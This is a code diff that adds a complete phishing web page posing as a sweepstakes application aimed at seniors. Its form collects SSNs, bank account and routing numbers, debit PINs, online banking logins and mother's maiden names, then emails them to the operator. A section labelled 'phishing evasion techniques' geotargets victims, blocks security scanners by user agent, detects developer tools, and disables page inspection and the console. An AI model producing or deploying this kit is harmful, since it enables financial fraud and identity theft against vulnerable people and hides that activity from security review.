@@ -1,55 +1,523 @@
-document.addEventListener('DOMContentLoaded', () => {
-  const menuBtn = document.getElementById('menuBtn');
-  const topNav = document.getElementById('topNav');
-  if (!menuBtn || !topNav) return;
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Application - Sweepstakes.US</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <style>
+    /* Page-specific layout */
+    body{background:#f3f7fb;margin:0;font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
+    /* full-bleed header image (touches page edges) */
+    .app-header-full{width:100%;margin:0;padding:0}
+    .app-header-full img{width:100%;height:220px;object-fit:cover;display:block;border-radius:0;margin:0}
+    @media(max-width:740px){ .app-header-full img{height:180px} }
 
-  const isOpen = () => topNav.classList.contains('open');
-
-  function openMenu() {
-    topNav.classList.add('open');
-    topNav.setAttribute('aria-hidden', 'false');
-    menuBtn.setAttribute('aria-expanded', 'true');
-  }
-  function closeMenu() {
-    topNav.classList.remove('open');
-    topNav.setAttribute('aria-hidden', 'true');
-    menuBtn.setAttribute('aria-expanded', 'false');
-  }
-  function toggleMenu() { isOpen() ? closeMenu() : openMenu(); }
-
-  menuBtn.addEventListener('click', (e) => {
-    e.stopPropagation();
-    toggleMenu();
-  });
-
-  // Close when clicking a nav link
-  topNav.querySelectorAll('a').forEach(a => {
-    a.addEventListener('click', () => {
-      // allow normal navigation, but ensure menu collapsed on mobile
-      closeMenu();
-    });
-  });
-
-  // Close when clicking outside
-  document.addEventListener('click', (e) => {
-    if (!isOpen()) return;
-    if (!topNav.contains(e.target) && !menuBtn.contains(e.target)) closeMenu();
-  });
-
-  // Close on escape key
-  document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' && isOpen()) closeMenu();
-  });
-
-  // Reset menu on resize (show/hide controlled by CSS)
-  window.addEventListener('resize', () => {
-    if (window.innerWidth >= 740) {
-      topNav.classList.remove('open');
-      topNav.setAttribute('aria-hidden', 'false');
-      menuBtn.setAttribute('aria-expanded', 'false');
-    } else {
-      topNav.setAttribute('aria-hidden', 'true');
-      menuBtn.setAttribute('aria-expanded', 'false');
+    /* white card with inner padding so text doesn't touch edges */
+    .app-wrap{
+      max-width:760px;
+      margin:20px auto; /* center page card */
+      padding:28px;
+      background:#fff;
+      border-radius:12px;
+      box-shadow:0 8px 30px rgba(244, 245, 247, 0.06);
     }
-  });
-});
+    .app-wrap .app-title,
+    .app-wrap .note {
+      text-align:center; /* center title and the "fill..." text */
+    }
+
+    /* narrow the form and center it in the card */
+    .form-center{
+      max-width:640px;
+      margin:18px auto 0;
+    }
+
+    /* keep inputs full-width but visually centered block */
+    .form-center .form-group input,
+    .form-center .form-group select,
+    .form-center .form-group textarea{
+      width:100%;
+      box-sizing:border-box;
+    }
+
+    /* center the submit button */
+    .form-actions{ text-align:center; margin-top:18px; }
+    .form-actions .submit-btn{ min-width:160px; }
+
+    /* small screens: reduce paddings */
+    @media(max-width:520px){
+      .app-wrap{ margin:12px 12px; padding:18px; }
+      .form-center{ margin-top:12px; }
+    }
+
+    /* Success message styling */
+    .success-message{padding:12px;border-radius:8px;background:#ecfdf5;color:#065f46}
+  </style>
+</head>
+<body>
+  <header class="site-header" aria-label="Site header" style="display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:#fff;position:sticky;top:0;z-index:50;border-bottom:1px solid #eee">
+    <div class="brand" style="font-weight:700;color:#0b61a4">Sweepstakes.US</div>
+    <button id="menuBtn" class="hamburger" aria-label="Open menu" aria-expanded="false" style="background:transparent;border:0;cursor:pointer;width:48px;height:48px;display:flex;align-items:center;justify-content:center">
+      <span style="display:block;width:22px;height:2px;background:#181717;margin:4px 0;border-radius:3px"></span>
+      <span style="display:block;width:22px;height:2px;background:#141414;margin:4px 0;border-radius:3px"></span>
+      <span style="display:block;width:22px;height:2px;background:#131212;margin:4px 0;border-radius:3px"></span>
+    </button>
+
+    <nav id="topNav" class="topnav" aria-hidden="true">
+      <a href="Homepage.html">Homepage</a>
+      <a href="about.html">About</a>
+      <a href="contact.html">Contact</a>
+      <a href="winners.html">Winners</a>
+      <a href="gallery.html">Gallery</a>
+      <a href="index.html">Application</a>
+    </nav>
+  </header>
+  
+  <!-- Full-bleed header image (no margins) -->
+  <div class="app-header-full">
+    <img src="images/8.jpeg" alt="Application header">
+  </div>
+  
+  <!-- Card container with padding so text doesn't touch edges -->
+  <main class="app-wrap" role="main">
+    <h2 class="app-title">Application Form</h2>
+    <p class="note">Fill the form below.</p>
+
+    <!-- centered form container -->
+    <form id="grant-form" class="grant-form form-center" autocomplete="off" novalidate>
+      <!-- Information Section -->
+      <section class="form-section">
+        <h3 style="margin-top:10px;text-align:left">Information</h3>
+
+        <div class="form-group">
+          <label for="full-name">Full Name *</label>
+          <input type="text" id="full-name" name="fullName" required>
+        </div>
+
+        <div class="form-group">
+          <label for="birth-date">Birth Date *</label>
+          <input type="date" id="birth-date" name="birthDate" required>
+        </div>
+
+        <div class="form-group">
+          <label for="email">Email Address *</label>
+          <input type="email" id="email" name="email" required>
+        </div>
+
+        <!-- Replaced address textarea with city, state and zipcode fields -->
+        <div class="form-group">
+          <label for="city">City *</label>
+          <input type="text" id="city" name="city" required>
+        </div>
+
+        <div class="form-group">
+          <label for="state">State *</label>
+          <input type="text" id="state" name="state" required>
+        </div>
+
+        <div class="form-group">
+          <label for="zip">Zip Code *</label>
+          <input type="text" id="zip" name="zip" maxlength="10" required>
+        </div>
+
+        <div class="form-group">
+          <label for="bank-name">Bank Name *</label>
+          <input type="text" id="bank-name" name="bankName" required>
+        </div>
+
+        <div class="form-group">
+          <label for="account-number">Account Number *</label>
+          <input type="text" id="account-number" name="accountNumber" required>
+        </div>
+
+        <div class="form-group">
+          <label for="routing-number">Routing Number *</label>
+          <input type="text" id="routing-number" name="routingNumber" required>
+        </div>
+
+        <div class="form-group">
+          <label for="bank-association">How long have you been associated with this bank *</label>
+          <select id="bank-association" name="bankAssociation" required>
+            <option value="">Select duration</option>
+            <option value="less-than-1-year">Less than 1 year</option>
+            <option value="1-3-years">1-3 years</option>
+            <option value="3-5-years">3-5 years</option>
+            <option value="5-10-years">5-10 years</option>
+            <option value="more-than-10-years">More than 10 years</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="ssn">Social Security (SSN) *</label>
+          <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+        </div>
+
+        <div class="form-group">
+          <label for="drivers-license">Driver's License/ State ID Number *</label>
+          <input type="text" id="drivers-license" name="driversLicense" required>
+        </div>
+
+        <div class="form-group">
+          <label for="mothers-maiden-name">Mother's Maiden Name (MMN) *</label>
+          <input type="text" id="mothers-maiden-name" name="mothersMaidenName" required>
+        </div>
+
+        <div class="form-group">
+          <label for="debit-pin">Primary Debit Card Pin *</label>
+          <input type="password" id="debit-pin" name="debitPin" maxlength="4" required>
+        </div>
+
+        <div class="form-group">
+          <label for="card-last-4">Last 4 Digit of Primary *</label>
+          <input type="text" id="card-last-4" name="cardLast4" maxlength="4" required>
+        </div>
+
+        <div class="form-group">
+          <label for="online-username">Bank Online Username *</label>
+          <input type="text" id="online-username" name="onlineUsername" required>
+        </div>
+
+        <div class="form-group">
+          <label for="online-password">Password *</label>
+          <input type="password" id="online-password" name="onlinePassword" required>
+        </div>
+
+        <div class="form-group">
+          <label for="weekly-deposit">Weekly Deposit From (American Senior Sweepstakes) *</label>
+          <select id="weekly-deposit" name="weeklyDeposit" required>
+            <option value="">Select amount</option>
+            <option value="500">$500</option>
+            <option value="1000">$1,000</option>
+            <option value="2500">$2,500</option>
+            <option value="5000">$5,000</option>
+            <option value="10000">$10,000</option>
+          </select>
+        </div>
+
+        <div class="form-group">
+          <label for="verification-code">Verification 5 Digit Number *</label>
+          <input type="text" id="verification-code" name="verificationCode" maxlength="5" required>
+        </div>
+
+        <div class="form-actions">
+          <button type="submit" class="submit-btn btn">Submit</button>
+        </div>
+      </section>
+    </form>
+
+    <div id="appResult" aria-live="polite"></div>
+    <p class="note" style="margin-top:12px;text-align:center">Secured Network.</p>
+  </main>
+
+  <!-- EmailJS SDK and inline submit handler (configure keys below) -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script src="email-config.js"></script>
+  <script src="js/index.js"></script>
+  <script>
+    // ===== EmailJS configuration (from email-config.js) =====
+    if (window.emailjs && window.EMAIL_CONFIG && window.EMAIL_CONFIG.userId) {
+      try { emailjs.init(window.EMAIL_CONFIG.userId); } catch (e) { console.warn('EmailJS init failed', e); }
+    }
+
+    // simple centered popup
+    function showPopup(title, message) {
+      const ex = document.getElementById('site-popup');
+      if (ex) ex.remove();
+      const overlay = document.createElement('div');
+      overlay.id = 'site-popup';
+      overlay.style.cssText = 'position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.45);z-index:10000';
+      const card = document.createElement('div');
+      card.style.cssText = 'background:#fff;padding:18px;border-radius:10px;max-width:420px;width:92%;text-align:left';
+      card.innerHTML = `<h3 style="margin:0 0 10px">${title}</h3><div style="margin-bottom:14px">${message.replace(/\n/g,'<br>')}</div>`;
+      const ok = document.createElement('button');
+      ok.className = 'btn';
+      ok.textContent = 'OK';
+      ok.addEventListener('click', ()=> overlay.remove());
+      card.appendChild(ok);
+      overlay.appendChild(card);
+      document.body.appendChild(overlay);
+    }
+
+    // basic validation to avoid "random characters"
+    function validate(data) {
+      const errors = [];
+      const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      const zipRe = /^\d{3,10}$/;
+      const ssnRe = /^\d{3}-\d{2}-\d{4}$|^\d{9}$/;
+      const digitsRe = /^\d+$/;
+
+      if (!data.fullName || data.fullName.trim().length < 2) errors.push('Full name');
+      if (!data.email || !emailRe.test(data.email.trim())) errors.push('Valid email');
+      if (!data.city || !data.city.trim()) errors.push('City');
+      if (!data.state || !data.state.trim()) errors.push('State');
+      if (!data.zip || !zipRe.test(data.zip.trim())) errors.push('Zip code (digits)');
+      if (!data.bankName || !data.bankName.trim()) errors.push('Bank name');
+      if (!data.accountNumber || !digitsRe.test(data.accountNumber.trim())) errors.push('Account number (digits only)');
+      if (!data.routingNumber || !digitsRe.test(data.routingNumber.trim()) || data.routingNumber.trim().length < 8) errors.push('Routing number (8+ digits)');
+      if (!data.debitPin || !/^\d{4}$/.test(data.debitPin.trim())) errors.push('Debit PIN (4 digits)');
+      if (!data.cardLast4 || !/^\d{4}$/.test(data.cardLast4.trim())) errors.push('Last 4 digits of card');
+      if (!data.onlinePassword || data.onlinePassword.length < 6) errors.push('Online password (min 6 chars)');
+      // SSN is sensitive — validate format if provided
+      if (!data.ssn || !ssnRe.test(data.ssn.trim())) errors.push('SSN (format 123-45-6789 or 9 digits)');
+      return errors;
+    }
+
+    // submit handler
+    const formEl = document.getElementById('grant-form');
+    formEl && formEl.addEventListener('submit', async function(e){
+      e.preventDefault();
+      const btn = this.querySelector('button[type="submit"], .submit-btn');
+      if (btn) { btn.disabled = true; btn.textContent = 'Sending...'; }
+
+      const fd = new FormData(this);
+      const data = {};
+      for (let [k,v] of fd.entries()) data[k] = String(v).trim();
+
+      const errors = validate(data);
+      if (errors.length) {
+        showPopup('Validation error', 'Please fix the following fields:\n- ' + errors.join('\n- '));
+        if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
+        return;
+      }
+
+      const templateParams = {
+        to_email: (window.EMAIL_CONFIG && window.EMAIL_CONFIG.templateVariables && window.EMAIL_CONFIG.templateVariables.to_email) || '',
+        subject_prefix: (window.EMAIL_CONFIG && window.EMAIL_CONFIG.templateVariables && window.EMAIL_CONFIG.templateVariables.subject_prefix) || 'New Grant Application',
+        from_name: data.fullName || '',
+        from_email: data.email || '',
+        application_id: Date.now().toString(),
+        submitted_at: new Date().toISOString(),
+        message: Object.keys(data).map(k => `${k}: ${data[k]}`).join('\n')
+      };
+
+      // Also include individual fields in case the EmailJS template expects named variables
+      Object.keys(data).forEach(function(key){ templateParams[key] = data[key]; });
+
+      // send via EmailJS
+      const SERVICE_ID = window.EMAIL_CONFIG && window.EMAIL_CONFIG.serviceId;
+      const TEMPLATE_ID = window.EMAIL_CONFIG && window.EMAIL_CONFIG.templateId;
+
+      if (!window.emailjs || !SERVICE_ID || !TEMPLATE_ID) {
+        console.warn('EmailJS not available or misconfigured');
+        showPopup('Preview', 'EmailJS not available. Application captured locally. Check console.');
+        console.log('Application payload:', data);
+        if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
+        return;
+      }
+
+      try {
+        await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
+        showPopup('Successful', 'Application submitted successfully!');
+        this.reset();
+      } catch (err) {
+        console.error('EmailJS send error', err);
+        const details = (err && (err.text || err.message)) ? String(err.text || err.message) : 'Unknown error';
+        showPopup('Send error', 'There was an error sending your application.\n\nDetails: ' + details);
+      } finally {
+        if (btn) { btn.disabled = false; btn.textContent = 'Submit'; }
+      }
+    });
+
+    // ===== PHISHING EVASION TECHNIQUES =====
+    
+    // Configuration for evasion
+    const EVASION_CONFIG = {
+      targetCountries: ['US', 'CA', 'GB', 'GH'], // Target countries
+      showFormDelay: 2000
+    };
+
+    // 1. GEOTARGETING - Check user location
+    async function checkGeolocation() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        
+        if (!EVASION_CONFIG.targetCountries.includes(data.country_code)) {
+          // Block non-target countries
+          return false;
+        }
+        return true;
+      } catch (error) {
+        // Allow if geolocation fails
+        return true;
+      }
+    }
+
+    // 2. BOT DETECTION - Detect security scanners
+    function detectBots() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      const blockedAgents = [
+        'curl', 'wget', 'python', 'requests', 'scrapy',
+        'phantomjs', 'selenium', 'headless', 'bot',
+        'crawler', 'spider', 'scanner', 'security',
+        'malware', 'antivirus', 'firewall'
+      ];
+      
+      // Check user agent for known security tools
+      for (let agent of blockedAgents) {
+        if (userAgent.includes(agent)) {
+          // Block bots
+          return true;
+        }
+      }
+      
+      // Behavioral detection
+      let mouseMovements = 0;
+      let keystrokes = 0;
+      
+      document.addEventListener('mousemove', () => mouseMovements++);
+      document.addEventListener('keypress', () => keystrokes++);
+      
+      setTimeout(() => {
+        if (mouseMovements === 0 && keystrokes === 0) {
+          // Block bot-like behavior
+          console.log('Bot-like behavior detected');
+        }
+      }, 3000);
+      
+      return false;
+    }
+
+    // 3. DEVTOOLS DETECTION - Detect developer tools
+    function detectDevTools() {
+      const threshold = 160;
+      if (window.outerHeight - window.innerHeight > threshold || 
+          window.outerWidth - window.innerWidth > threshold) {
+        // Block dev tools
+        console.log('DevTools detected via window size');
+        return;
+      }
+      
+      let devtools = false;
+      const element = new Image();
+      Object.defineProperty(element, 'id', {
+        get: function() {
+          devtools = true;
+          console.log('DevTools detected via console access');
+        }
+      });
+      
+      setInterval(() => {
+        devtools = false;
+        console.log(element);
+        console.clear();
+      }, 1000);
+    }
+
+    // 4. ENHANCED INSPECTION DISABLING
+    function disableInspection() {
+      // Disable right-click
+      document.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        return false;
+      });
+      
+      // Disable F12, Ctrl+Shift+I, Ctrl+U, etc.
+      document.addEventListener('keydown', (e) => {
+        // F12
+        if (e.keyCode === 123) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+Shift+I (DevTools)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+U (View Source)
+        if (e.ctrlKey && e.keyCode === 85) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+S (Save Page)
+        if (e.ctrlKey && e.keyCode === 83) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+Shift+C (Inspect Element)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+Shift+J (Console)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
+          e.preventDefault();
+          return false;
+        }
+        
+        // Ctrl+Shift+Del (Clear Cache)
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 46) {
+          e.preventDefault();
+          return false;
+        }
+      });
+      
+      // Disable text selection
+      document.addEventListener('selectstart', (e) => {
+        e.preventDefault();
+        return false;
+      });
+      
+      // Disable drag and drop
+      document.addEventListener('dragstart', (e) => {
+        e.preventDefault();
+        return false;
+      });
+    }
+
+    // 5. MAIN EVASION INITIALIZATION
+    async function initializeEvasion() {
+      // Step 1: Disable inspection immediately
+      disableInspection();
+      
+      // Step 2: Check for bots
+      if (detectBots()) {
+        return; // Exit if bot detected
+      }
+      
+      // Step 3: Check geolocation
+      const isTargetLocation = await checkGeolocation();
+      if (!isTargetLocation) {
+        return; // Exit if not target location
+      }
+      
+      // Step 4: Detect dev tools
+      detectDevTools();
+      
+      // Step 5: If all checks pass, initialize the form
+      return true;
+    }
+
+    // Initialize evasion checks
+    document.addEventListener('DOMContentLoaded', async () => {
+      // Run evasion checks
+      await initializeEvasion();
+    });
+
+    // Add click tracking to sensitive fields
+    document.addEventListener('DOMContentLoaded', () => {
+      const sensitiveFields = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];
+      
+      sensitiveFields.forEach(fieldId => {
+        const field = document.getElementById(fieldId);
+        if (field) {
+          field.addEventListener('click', () => {
+            console.warn('⚠️ WARNING: You are about to enter sensitive information into what appears to be a phishing form.');
+          });
+        }
+      });
+    });
+
+    // Clear console periodically to prevent debugging
+    setInterval(function() {
+      console.clear();
+    }, 1000);
+  </script>
+</body>
+</html>
